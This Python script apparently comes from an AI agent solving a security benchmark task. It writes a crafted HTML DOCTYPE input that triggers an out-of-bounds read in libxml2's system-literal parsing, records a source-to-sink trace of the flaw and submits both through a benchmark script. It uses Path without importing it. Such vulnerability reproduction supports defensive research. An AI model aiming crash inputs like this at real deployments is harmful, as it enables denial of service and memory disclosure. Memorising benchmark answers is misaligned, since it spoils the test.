import json, subprocess, os, textwrap, sys
p=Path('/workspace/candidate1.bin')
doc=b'\x00\x00\x00\x00\x00\x00\x00\x00' + b'<!DOCTYPE html SYSTEM "' + b'A'*600 + b'">\n<html></html>'
p.write_bytes(doc)
analysis={
  "sample_id":"secbench_oss_libxml2.ossfuzz-42522712",
  "fine_trace":[
    {"step":1,"file":"HTMLparser.c","function":"htmlParseSystemLiteral","line":2997,"var":"startPosition = CUR_PTR - BASE_PTR","code":"startPosition = CUR_PTR - BASE_PTR;","role":"source","note":"The input-controlled system literal starts after the opening quote and its offset is recorded relative to the parser input buffer base."},
    {"step":2,"file":"HTMLparser.c","function":"htmlParseSystemLiteral","line":3007,"var":"len","code":"len++;","role":"intermediate","note":"Each byte parsed inside the attacker-controlled system literal increases the length later supplied to xmlStrndup."},
    {"step":3,"file":"HTMLparser.c","function":"htmlParseSystemLiteral","line":3015,"var":"xmlStrndup((BASE_PTR+startPosition), len)","code":"ret = xmlStrndup((BASE_PTR+startPosition), len);","role":"root_cause","note":"The parser should ensure the recorded offset and counted length still designate bytes inside the current input buffer before duplicating the literal."},
    {"step":4,"file":"xmlstring.c","function":"xmlStrndup","line":53,"var":"memcpy(ret, cur, len)","code":"memcpy(ret, cur, len);","role":"sink","note":"xmlStrndup trusts the caller-provided pointer and length and reads len bytes from cur, producing the out-of-bounds read when they exceed the backing buffer."}
  ],
  "vuln_logic":{
    "source":{"file":"HTMLparser.c","function":"htmlParseSystemLiteral","line":2997,"operands":["CUR_PTR","BASE_PTR","startPosition"]},
    "root_cause":{"file":"HTMLparser.c","function":"htmlParseSystemLiteral","line":3015,"operands":["BASE_PTR+startPosition","len"],"relation":{"op":"le","left":"(BASE_PTR+startPosition) + len","right":"ctxt->input->end"}},
    "sink":{"file":"xmlstring.c","function":"xmlStrndup","line":53,"operands":["ret","cur","len"],"relation":{"op":"le","left":"cur + len","right":"ctxt->input->end"}},
    "propagation":[{"from":{"file":"HTMLparser.c","function":"htmlParseSystemLiteral","line":2997,"operands":["startPosition"]},"to":{"file":"xmlstring.c","function":"xmlStrndup","line":53,"operands":["cur","len"]},"type":"data","via":["xmlStrndup((BASE_PTR+startPosition), len)"]}]
  }
}
Path('/workspace/analysis.json').write_text(json.dumps(analysis,separators=(',',':')), encoding='utf-8')
print(p, p.stat().st_size)
res=subprocess.run(['bash','/workspace/submit.sh',str(p),'/workspace/analysis.json'],cwd='/workspace',text=True,capture_output=True,timeout=240)
print('rc',res.returncode)
print('stdout',res.stdout)
print('stderr',res.stderr)
